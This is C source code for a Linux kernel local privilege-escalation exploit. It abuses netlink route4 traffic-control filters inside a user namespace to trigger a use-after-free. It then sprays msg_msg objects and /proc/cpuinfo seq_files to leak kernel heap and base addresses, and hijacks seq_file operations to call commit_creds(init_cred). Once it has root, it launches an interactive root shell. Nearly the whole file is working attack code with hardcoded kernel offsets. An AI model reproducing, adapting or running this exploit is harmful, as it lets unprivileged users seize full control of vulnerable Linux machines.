#define _GNU_SOURCE

#include <arpa/inet.h>
#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <assert.h>

#include <linux/capability.h>
#include <linux/futex.h>
#include <linux/genetlink.h>
#include <linux/if_addr.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_tun.h>
#include <linux/in6.h>
#include <linux/ip.h>
#include <linux/neighbour.h>
#include <linux/net.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/tcp.h>
#include <linux/veth.h>
#include <linux/sched.h>
#include <linux/pkt_sched.h>
#include <linux/pkt_cls.h>
#include <sys/ipc.h>
#include <sys/msg.h>

// #define DEBUG

uint64_t KERNEL_HEAP = 0;
uint64_t KERNEL_BASE = 0xffffffff81000000ul;

#define MSG_SPRAY_NUM 0x20
#define MAX_FD        0x10
#define PAGE_SIZE     0x1000
#define CR4_DESIRED_VALUE	0x6f0

#define PAGE_SIZE                0x1000
#define CPUINFO_OP_OFFSET        0x1005f20

#define INIT_CRED                (KERNEL_BASE + 0x165bb20)
#define XOR_RAX_RET              (KERNEL_BASE + 0x1e6f80)
#define INSTALL_CRED             (KERNEL_BASE + 0x23cbf0)
#define REGCACHE_MARK_DIRTY      (KERNEL_BASE + 0x564f80)
#define NATIVE_WRITE_CR4         (KERNEL_BASE + 0x0647f0)
#define COMMIT_CREDS             (KERNEL_BASE + 0x0a1fe0)
#define PREPARE_KERNEL_CRED      (KERNEL_BASE + 0x0a2480)
#define ACPI_EVENT               (KERNEL_BASE + 0x47e130)

#define AND_RAX                  (KERNEL_BASE + 0x0a00f3)

typedef unsigned long __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

int get_root_payload(void) {
	((_commit_creds)(COMMIT_CREDS))(
		((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0)
	);
    return 0;
}

int msgids[MSG_SPRAY_NUM] = {};
int fds[MAX_FD] = {};

void DumpHex(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

bool write_file(const char* file, const char* what, ...) {
    char buf[1024];
    va_list args;
    va_start(args, what);
    vsnprintf(buf, sizeof(buf), what, args);
    va_end(args);
    buf[sizeof(buf) - 1] = 0;
    int len = strlen(buf);

    int fd = open(file, O_WRONLY | O_CLOEXEC);
    if (fd == -1)
        return false;
    if (write(fd, buf, len) != len) {
        close(fd);
        return false;
    }
    close(fd);
    return true;
}

void setup_namespace() {
    int real_uid = getuid();
    int real_gid = getgid();

    if (unshare(CLONE_NEWUSER) != 0) {
        perror("[-] unshare(CLONE_NEWUSER)");
        exit(EXIT_FAILURE);
    }

    if (unshare(CLONE_NEWNET) != 0) {
        perror("[-] unshare(CLONE_NEWUSER)");
        exit(EXIT_FAILURE);
    }

    if (!write_file("/proc/self/setgroups", "deny")) {
        perror("[-] write_file(/proc/self/set_groups)");
        exit(EXIT_FAILURE);
    }
    if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
        perror("[-] write_file(/proc/self/uid_map)");
        exit(EXIT_FAILURE);
    }
    if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
        perror("[-] write_file(/proc/self/gid_map)");
        exit(EXIT_FAILURE);
    }

    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(0, &my_set);
    if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
        perror("[-] sched_setaffinity()");
        exit(EXIT_FAILURE);
    }

    if (system("/sbin/ifconfig lo up") != 0) {
        perror("[-] system(/sbin/ifconfig lo up)");
        exit(EXIT_FAILURE);
    }
}

#define NLMSG_TAIL(nmsg) \
    ((struct rtattr *) (((void *) (nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))

int addattr_l(struct nlmsghdr *n, int maxlen, int type, const void *data,
          int alen)
{
    int len = RTA_LENGTH(alen);
    struct rtattr *rta;

    if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
        fprintf(stderr,
            "addattr_l ERROR: message exceeded bound of %d\n",
            maxlen);
        return -1;
    }
    rta = NLMSG_TAIL(n);
    rta->rta_type = type;
    rta->rta_len = len;
    if (alen)
        memcpy(RTA_DATA(rta), data, alen);
    n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
    return 0;
}

struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type)
{
    struct rtattr *nest = NLMSG_TAIL(n);

    addattr_l(n, maxlen, type, NULL, 0);
    return nest;
}

int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest)
{
    nest->rta_len = (void *)NLMSG_TAIL(n) - (void *)nest;
    return n->nlmsg_len;
}

int sockfd = -1;

int add_qdisc() {
    char *start = malloc(0x1000);
    memset(start, 0, 0x1000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    // new qdisc
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST|NLM_F_EXCL|NLM_F_CREATE;
    msg->nlmsg_type = RTM_NEWQDISC;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));
    // set local
    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = TC_H_ROOT;
    // prio, protocol
    u_int32_t prio = 1;
    u_int32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio<<16, protocol);

    addattr_l(msg, 0x1000, TCA_KIND, "sfq", 4);

    // packing
#ifdef DEBUG
    DumpHex(msg, msg->nlmsg_len);
#endif

    struct iovec iov = {
        .iov_base = msg,
        .iov_len = msg->nlmsg_len
    };
    struct sockaddr_nl nladdr = { .nl_family = AF_NETLINK };
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };
    return sendmsg(sockfd, &msgh, 0);
}

int add_tc(u_int32_t from, u_int32_t to, u_int32_t iif, u_int32_t handle, u_int16_t flags) {
    char *start = malloc(0x2000);
    memset(start, 0, 0x2000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    // new filter
    msg = msg + msg->nlmsg_len;
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST|flags;
    msg->nlmsg_type = RTM_NEWTFILTER;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    // prio, protocol
    u_int32_t prio = 1;
    u_int32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio<<16, protocol);
    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_handle = handle;
    // t->tcm_parent = TC_H_ROOT;

    addattr_l(msg, 0x1000, TCA_KIND, "route", 6);
    struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
    if (from)
        addattr_l(msg, 0x1000, TCA_ROUTE4_FROM, &from, 4);
    if (to)
        addattr_l(msg, 0x1000, TCA_ROUTE4_TO, &to, 4);
    if (iif)
        addattr_l(msg, 0x1000, TCA_ROUTE4_IIF, &iif, 4);
    addattr_nest_end(msg, tail);
    

    // packing
    struct iovec iov = {
        .iov_base = msg,
        .iov_len = msg->nlmsg_len
    };
    struct sockaddr_nl nladdr = { .nl_family = AF_NETLINK };
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };
    sendmsg(sockfd, &msgh, 0);

    free(start);
    return 1;
}


int add_tc_(u_int32_t from, u_int32_t to, u_int32_t handle, u_int16_t flags) {
    char *start = malloc(0x2000);
    memset(start, 0, 0x2000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    // new filter
    msg = msg + msg->nlmsg_len;
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST|flags;
    msg->nlmsg_type = RTM_NEWTFILTER;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    // prio, protocol
    u_int32_t prio = 1;
    u_int32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio<<16, protocol);
    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_handle = handle;
    // t->tcm_parent = TC_H_ROOT;

    addattr_l(msg, 0x1000, TCA_KIND, "route", 6);
    struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
    addattr_l(msg, 0x1000, TCA_ROUTE4_FROM, &from, 4);
    addattr_l(msg, 0x1000, TCA_ROUTE4_TO, &to, 4);
    addattr_nest_end(msg, tail);
    

    // packing
    struct iovec iov = {
        .iov_base = msg,
        .iov_len = msg->nlmsg_len
    };
    struct sockaddr_nl nladdr = { .nl_family = AF_NETLINK };
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(sockfd, &msgh, 0);

    free(start);
    return 1;
}

void *dump_tc(u_int32_t from, u_int32_t to, u_int32_t handle, u_int16_t flags) {
    char *start = malloc(0x2000);
    memset(start, 0, 0x2000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    // new filter
    msg = msg + msg->nlmsg_len;
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO | flags;
    msg->nlmsg_type = RTM_GETTFILTER;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    // prio, protocol
    u_int32_t prio = 1;
    u_int32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio<<16, protocol);
    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_handle = handle;
    // t->tcm_parent = TC_H_ROOT;

    addattr_l(msg, 0x1000, TCA_KIND, "route", 6);
    struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
    addattr_l(msg, 0x1000, TCA_ROUTE4_FROM, &from, 4);
    addattr_l(msg, 0x1000, TCA_ROUTE4_TO, &to, 4);
    addattr_nest_end(msg, tail);
    

    // packing
    struct iovec iov = {
        .iov_base = msg,
        .iov_len = msg->nlmsg_len
    };
    struct sockaddr_nl nladdr = { .nl_family = AF_NETLINK };
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(sockfd, &msgh, 0);
    memset(start, 0, 0x2000);
    iov.iov_len = 0x2000;
    iov.iov_base = start;
    recvmsg(sockfd, &msgh, 0);

    if (msgh.msg_namelen != sizeof(nladdr)) {
        printf("size of sender address is wrong\n");
    }

    // DumpHex(start, 0x200);

    // free(start);

    return start;
}

void* dump_tc1() {
    // from hash == 31
    return dump_tc(0, 0x7f, 0x7f7f, 0);
}

void add_tc_leak1() {
    add_tc(0, 0, 0x1f, 0x801f8000, NLM_F_EXCL|NLM_F_CREATE);
}

void add_tc_leak2() {
    add_tc(0, 0x11, 0x2f, 0x801f8000, NLM_F_CREATE);
}

void add_tc1() {
    add_tc_(0, 0x7f, 0x7f7f, NLM_F_EXCL|NLM_F_CREATE);
}

void add_tc2() {
    add_tc_(0, 0x11, 0x7f7f, NLM_F_CREATE);
}

/* spray 256 */
struct msg {
    long mtype;
    char data[0];
};

int msg_init() {
    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    if (msqid < 0) {
        perror("msgget");
    }
    return msqid;
}

void msg_alloc(int msqid, size_t size) {
    struct msg *m = malloc(sizeof(struct msg) + size);
    m->mtype = 1;
    memset(m->data, 'B', size);

    // set handle
    *(uint32_t*)((char*)m + 0x40 - 40) = 0xdead;
    // func hijacking 1: ruc call back
    //*(uint64_t*)((char*)m + 0x98 - 40) = 0x2f746d702f78;
    *(uint64_t*)((char*)m + 0xa0 - 40) = 0xffffffff81248250;
    // func hijacking 2: work_struct workfunc
    *(uint64_t*)((char*)m + 0x70 - 40) = 0xdeadbeefdeadbeef;

    if (msgsnd(msqid, (void *)m, size-48, 0) != 0) {
        perror("msgsnd");
    }
    free(m);
}

void msg_free(int msqid, size_t size) {
    char *data = malloc(size+0x10);
    if(msgrcv(msqid, data, size, 1, 0) < 0) {
        perror("msgrcv");
    }
    free(data);
}


char* msg_get(int id, size_t size) {
    char *data = malloc(size+0x10);
    msgrcv(id, data, size, 1, 0);
    return data;
}

int kmalloc_msg(int num) {
    int msqid;
    msqid = msg_init();

    for (int i=0; i<num; i++) {
        if (i%50 == 0)
            msqid = msg_init();
        msg_alloc(msqid, 0xa8);
    }
    return msqid;
}

void alloc_msg(int msqid, int num) {
    for (int i=0; i<num; i++) {
        // kmalloc 256
        if (i%50 == 0)
            msqid = msg_init();
        msg_alloc(msqid, 0xa8);
    }
}

bool is_root() {
	// We can't simple check uid, since we're running inside a namespace
	// with uid set to 0. Try opening /etc/shadow instead.
	int fd = open("/etc/shadow", O_RDONLY);
	if (fd == -1)
		return false;
	close(fd);
	return true;
}

/*
static void close_work(struct work_struct *work)
{
    struct bsd_acct_struct *acct = container_of(work, struct bsd_acct_struct, work);
    struct file *file = acct->file;
    if (file->f_op->flush)
        file->f_op->flush(file, NULL);
    __fput_sync(file);
    complete(&acct->done);
}

static int cgroup_seqfile_show(struct seq_file *m, void *arg)
{
    struct cftype *cft = seq_cft(m);
    struct cgroup_subsys_state *css = seq_css(m);

    if (cft->seq_show)
        return cft->seq_show(m, arg);

    if (cft->read_u64)
        seq_printf(m, "%llu\n", cft->read_u64(css, cft));
    else if (cft->read_s64)
        seq_printf(m, "%lld\n", cft->read_s64(css, cft));
    else
        return -EINVAL;
    return 0;
}
*/

void exploit() {
    int msqid = msg_init();
    int msqid2 = msg_init();
    uint64_t *data;
    uint64_t kernel_heap;

    add_qdisc();
    add_tc_leak1();
#ifdef DEBUG
    printf("Freeing the route4_filter\n");
#endif
    add_tc_leak2();
#ifdef DEBUG
    printf("Sleep for a while making sure route4_filter is freed\n");
#endif
    sleep(1);

    struct msg *m = malloc(sizeof(struct msg) + 192 + PAGE_SIZE);
    m->mtype = 1;
    memset(m->data, 0, 192);
    // set handle
    *(uint32_t*)((char*)m + 0x40 - 40) = 0x801f8000;

    for (int i=0;i<8;i++){
        if (msgsnd(msqid, (void *)m, 128-48, 0) != 0) {
            perror("msgsnd");
        }
    }

    data = dump_tc(0, 0x7f, 0x801f8000, 0);
#ifdef DEBUG
    DumpHex(data, 100);
#endif
    kernel_heap = data[8];
    kernel_heap = kernel_heap & 0xffffffff;
    kernel_heap = kernel_heap << 32;
    free(data);

    add_tc1();
    add_tc2();
    sleep(1);

    *(uint32_t*)((char*)m + 0x40 - 40) = 0x7f7f;
    for (int i=0;i<8;i++){
        if (msgsnd(msqid2, (void *)m, 128-48, 0) != 0) {
            perror("msgsnd");
        }
    }
    data = dump_tc(0, 0x7f, 0x7f7f, 0);
#ifdef DEBUG
    DumpHex(data, 0x100);
#endif
    free(data);
    data = dump_tc(0, 0x7f, 0x7f7f, 0);

#ifdef DEBUG
    DumpHex(data, 0x100);
#endif

    kernel_heap = kernel_heap + ((data[9]&0xffff) << 16);
    printf("here is the heap addr: 0x%lx\n", kernel_heap);

    for (int i=0; i<MSG_SPRAY_NUM; i++) {
        msgids[i] = msg_init();
    }

    for (int i=0; i<8; i++) {
        msg_free(msqid2, 128-48);
    }

    char *spray = m->data+PAGE_SIZE-48-8;
    memset(spray, 0, 192);
    *(uint32_t *)(spray + 0x40) = 0x7f7f;
    *(uint64_t *)(spray + 0x30) = kernel_heap;

    for (int i=0; i<MSG_SPRAY_NUM/2; i++) {
        if (msgsnd(msgids[i], m, PAGE_SIZE+128-48-8, 0) != 0) {
            perror("msgsnd in spraying");
        }
    }
    // free the msg_msg
    add_tc2();
    sleep(1);

    // spray seq_file
    for (int i=0; i<MAX_FD; i++) {
        fds[i] = open("/proc/cpuinfo", 0);
    }

    // for (int i=0; i<MAX_FD; i++) {
    //     lseek(fds[i], CR4_DESIRED_VALUE, SEEK_SET);
    // }

#ifdef DEBUG
    printf("we have spraied seq_files, let's leaking\n");
#endif
    uint64_t *leaked;
    int current = 0;
    for (int i=0; i<MSG_SPRAY_NUM/2; i++) {
        current ++;
#ifdef DEBUG
        printf("leaking ... %d\n", i);
#endif
        leaked = (uint64_t*)(msg_get(msgids[i], PAGE_SIZE+128-48-8)+PAGE_SIZE-48);
#ifdef DEBUG
        DumpHex(leaked, 132);
#endif
        if (leaked[12] != 0)
            break;
        // fill the hold
        if (msgsnd(msgids[i], m, 127-48, 0) != 0) {
            perror("msgsnd");
        }
    }

    KERNEL_BASE = leaked[12] - CPUINFO_OP_OFFSET;
    KERNEL_HEAP = leaked[11] - 0x50;

    printf("we found cpuinfo_op at %lx\n", leaked[12]);
    printf("we found kernel base at 0x%lx\n", KERNEL_BASE);
    printf("we found kernel heap at 0x%lx\n", KERNEL_HEAP);

    // we are jumping to regcache_mark_dirty
    // func 1 0x20, func 2 0x28 arg 0x30

    // m->buff == heap_addr;
    // m->size == PAGE_SIZE; 0x8
    // m->count == 0; 0x18
    // m->read_pos == xxx; 0x30
    // m->version == 0; 0x38

    // type = struct seq_file {
    //     char *buf;       0
    //     size_t size;     8
    //     size_t from;     0x10
    //     size_t count;    0x18
    //     size_t pad_until;  0x20
    //     loff_t index;      0x28
    //     loff_t read_pos;   0x30
    //     u64 version;       0x38
    //     struct mutex lock; 0x40
    //     const struct seq_operations *op;  0x60
    //     int poll_event;                   0x68
    //     const struct file *file;          0x70
    //     void *private;                    0x78
    // }
    // acpi_ec_event_processor

    // cpuinfo_ops:
    // struct seq_operations {
    //     void * (*start) (struct seq_file *m, loff_t *pos);
    //     void (*stop) (struct seq_file *m, void *v);
    //     void * (*next) (struct seq_file *m, void *v, loff_t *pos);
    //     int (*show) (struct seq_file *m, void *v);
    // };
    // start == xor rax, rax; ret
    // stop == jump table

    /*
    struct remote_function_call {
        struct task_struct  *p;
        remote_function_f   func;
        void            *info;
        int         ret;
    };
    */

    memcpy(spray, leaked, 120);
    uint64_t *rop = (uint64_t *)spray;
    /* pre condition */
    rop[0x38/8] = 0;
    rop[0x18/8] = 0;

    /* ops */
    rop[0x60/8] = KERNEL_HEAP+0x68;
    rop[0x68/8] = XOR_RAX_RET;
    rop[0x70/8] = ACPI_EVENT;
    // rop[0x78/8] = remote...;

    // acpi_ec_query_handler
    rop[0x20/8] = KERNEL_HEAP + 0x38; // handler
    /*
    type = struct acpi_ec_query_handler {
        struct list_head node;
        acpi_ec_query_func func;
        acpi_handle handle;
        void *data;
        u8 query_bit;
        struct kref kref;
    }
    */
   rop[0x48/8] = COMMIT_CREDS;
   rop[0x58/8] = INIT_CRED;


    for (int i=0; i<MSG_SPRAY_NUM; i++) {
        // if (msgsnd(msgids[i], m, PAGE_SIZE+128-48-8, 0) != 0) {
        if (msgsnd(msgids[i], m, PAGE_SIZE-8+128-48, 0) != 0) {
            perror("msgsnd in spraying");
        }
    }


#ifdef DEBUG
    printf("press any button to continue...\n");
    getchar();
#endif

    for (int i=0; i<MAX_FD; i++) {
        // lseek(fds[i], KERNEL_HEAP-0x38, SEEK_SET);
        char c;
        read(fds[i], &c, 1);
    }

    if (is_root()) {
        if (fork() == 0) {
            printf("getting root\n");
            char *args[] = {"/bin/sh", "-i", NULL};
            execve("/bin/sh", args, NULL);
        }
    } else {
        printf("we are not root....\n");
    }

    while(1) sleep(10);
}

int main() {
    setup_namespace();
    sockfd = socket(PF_NETLINK, SOCK_RAW, 0);
    assert(sockfd != -1);

    exploit();
}


